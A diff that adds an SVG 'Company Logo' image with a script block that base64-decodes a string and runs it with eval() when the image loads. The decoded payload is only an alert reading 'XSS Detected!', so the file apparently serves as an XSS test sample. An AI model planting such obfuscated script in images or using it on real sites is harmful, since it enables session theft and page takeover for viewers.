@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">
+    <rect width="400" height="300" fill="#4a90e2"/>
+    <circle cx="200" cy="150" r="80" fill="#ff6b6b"/>
+    <text x="200" y="160" font-family="Arial" font-size="20" fill="white" text-anchor="middle">
+        Company Logo
+    </text>
+    
+    <script type="text/javascript">
+        <![CDATA[
+            // Base64 encoded payload
+            var payload = "YWxlcnQoJ1hTUyBEZXRlY3RlZCEnKQ==";
+            eval(atob(payload));
+        ]]>
+    </script>
+</svg>
